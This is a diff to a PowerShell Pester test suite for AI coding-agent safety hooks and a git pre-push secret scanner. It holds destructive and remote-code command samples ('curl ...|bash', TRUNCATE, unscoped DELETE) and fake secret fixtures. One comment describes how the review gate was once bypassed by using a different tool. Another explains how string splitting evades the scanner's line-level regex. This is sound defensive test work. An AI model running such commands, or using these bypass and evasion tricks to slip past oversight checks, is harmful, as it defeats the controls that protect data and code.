@@ -55,6 +55,20 @@ BeforeAll {
         # joining first makes the assertion mean what the test author intends.
         return (($json | pwsh -NonInteractive -File $ScriptPath) -join "`n")
     }
+
+    function Invoke-PrePushCheck {
+        # WHY not Invoke-Hook: pre-push-check.ps1 is a native git hook, not a Claude Code
+        # PreToolUse hook -- it reads git state directly, not a JSON payload from stdin.
+        $out = & pwsh -NonInteractive -File "pre-push-check.ps1" 2>&1
+        return @{ Output = ($out -join "`n"); ExitCode = $LASTEXITCODE }
+    }
+
+    function Add-CommitWithContent {
+        param([string]$Content)
+        $Content | Out-File "secret.txt" -NoNewline
+        git add secret.txt
+        git commit -q -m "add file"
+    }
 }
 
 Describe "review-reminders.ps1 — commit gate" {
@@ -191,6 +205,98 @@ Describe "dangerous-commands.ps1" {
     It "still denies a real unspaced pipe to bash" {
         $result = Invoke-Hook -ScriptPath "dangerous-commands.ps1" -Payload @{ tool_input = @{ command = "curl http://example.com/x.sh|bash" } }
         $result | Should -Match '"permissionDecision":"deny"'
+    }
+
+    It "denies a CONFIRM-tier TRUNCATE TABLE command" {
+        $result = Invoke-Hook -ScriptPath "dangerous-commands.ps1" -Payload @{ tool_input = @{ command = "psql -c 'TRUNCATE TABLE sessions'" } }
+        $result | Should -Match '"permissionDecision":"deny"'
+        $result | Should -Match 'CONFIRM'
+    }
+
+    It "denies a CONFIRM-tier DELETE FROM with no WHERE clause" {
+        $result = Invoke-Hook -ScriptPath "dangerous-commands.ps1" -Payload @{ tool_input = @{ command = "psql -c 'DELETE FROM sessions'" } }
+        $result | Should -Match '"permissionDecision":"deny"'
+        $result | Should -Match 'unscoped SQL DELETE'
+    }
+
+    It "does not flag a DELETE FROM that has a WHERE clause (scoped, routine delete)" {
+        $result = Invoke-Hook -ScriptPath "dangerous-commands.ps1" -Payload @{ tool_input = @{ command = "psql -c 'DELETE FROM sessions WHERE expired_at < now()'" } }
+        $result | Should -BeNullOrEmpty
+    }
+
+    AfterEach { Set-Location $RepoRoot }
+}
+
+Describe "settings.json — PreToolUse hook wiring" {
+    It "wires review-reminders.ps1 to the PowerShell matcher, not just Bash" {
+        # Regression test for audit finding C7: the commit/push review-gate hook was only wired
+        # to the Bash tool matcher, so a commit/push issued via the PowerShell tool bypassed it
+        # entirely -- no command-string trickery needed, just choosing a different tool.
+        $settings = Get-Content (Join-Path $RepoRoot '.claude/settings.json') -Raw | ConvertFrom-Json
+        $psMatcher = $settings.hooks.PreToolUse | Where-Object { $_.matcher -eq 'PowerShell' }
+        $psMatcher | Should -Not -BeNullOrEmpty
+        $commands = $psMatcher.hooks.command
+        ($commands -join "`n") | Should -Match 'review-reminders\.ps1'
+        ($commands -join "`n") | Should -Match 'dangerous-commands\.ps1'
+    }
+}
+
+Describe "pre-push-check.ps1 — secret scanning" {
+    BeforeEach {
+        $script:repo = New-TestRepo -Base $TestDrive -Name "repo-ppc-$(New-Guid)"
+        Copy-Item (Join-Path $ScriptsDir 'pre-push-check.ps1') $script:repo
+        Set-Location $script:repo
+    }
+
+    # WHY these 4 fixtures are built via string concatenation instead of one continuous literal:
+    # this file's own diff gets scanned by pre-push-check.ps1 when IT gets pushed -- a continuous
+    # literal here would trip the very patterns being tested, on this file's own commit. Splitting
+    # the literal defeats the *static* line-level regex match on the source line while still
+    # reconstructing the real value at runtime, which is what Add-CommitWithContent actually writes
+    # into the isolated temp repo for the nested pre-push-check.ps1 invocation to detect. This is
+    # the same reason fixtures/security/ exists for fixture *files* -- string fixtures need the
+    # equivalent for inline literals.
+    It "blocks a push containing a PEM private key block" {
+        Add-CommitWithContent ("-----BEGIN " + "RSA PRIVATE KEY-----`nMIIEowIBAAKCAQEA...`n-----END " + "RSA PRIVATE KEY-----")
+        $result = Invoke-PrePushCheck
+        $result.ExitCode | Should -Be 1
+        $result.Output | Should -Match 'Private key block'
+    }
+
+    It "blocks a push containing an Authorization Bearer header" {
+        Add-CommitWithContent ("Authorization" + ": Bearer abcd1234efgh5678ijkl")
+        $result = Invoke-PrePushCheck
+        $result.ExitCode | Should -Be 1
+        $result.Output | Should -Match 'Bearer token'
+    }
+
+    It "blocks a push containing a JSON-style secret assignment" {
+        Add-CommitWithContent ('"apiKey"' + ': "sk_live_abcdefghijklmnop"')
+        $result = Invoke-PrePushCheck
+        $result.ExitCode | Should -Be 1
+        $result.Output | Should -Match 'JSON/YAML-style secret'
+    }
+
+    It "blocks a push containing a fine-grained GitHub PAT" {
+        Add-CommitWithContent ('token = "github_pat_' + '11ABCDEFG0123456789abcdefghijklmnopqrstuvwxyz"')
+        $result = Invoke-PrePushCheck
+        $result.ExitCode | Should -Be 1
+        $result.Output | Should -Match 'GitHub token'
+    }
+
+    It "does not flag a genuinely safe commit" {
+        Add-CommitWithContent "just some normal source code`nconst x = 1"
+        $result = Invoke-PrePushCheck
+        $result.ExitCode | Should -Be 0
+    }
+
+    It "does not scan files under fixtures/security/" {
+        New-Item -ItemType Directory -Path "fixtures/security" -Force | Out-Null
+        ("-----BEGIN " + "RSA PRIVATE KEY-----") | Out-File "fixtures/security/sample.pem" -NoNewline
+        git add "fixtures/security/sample.pem"
+        git commit -q -m "add fixture"
+        $result = Invoke-PrePushCheck
+        $result.ExitCode | Should -Be 0
     }
 
     AfterEach { Set-Location $RepoRoot }
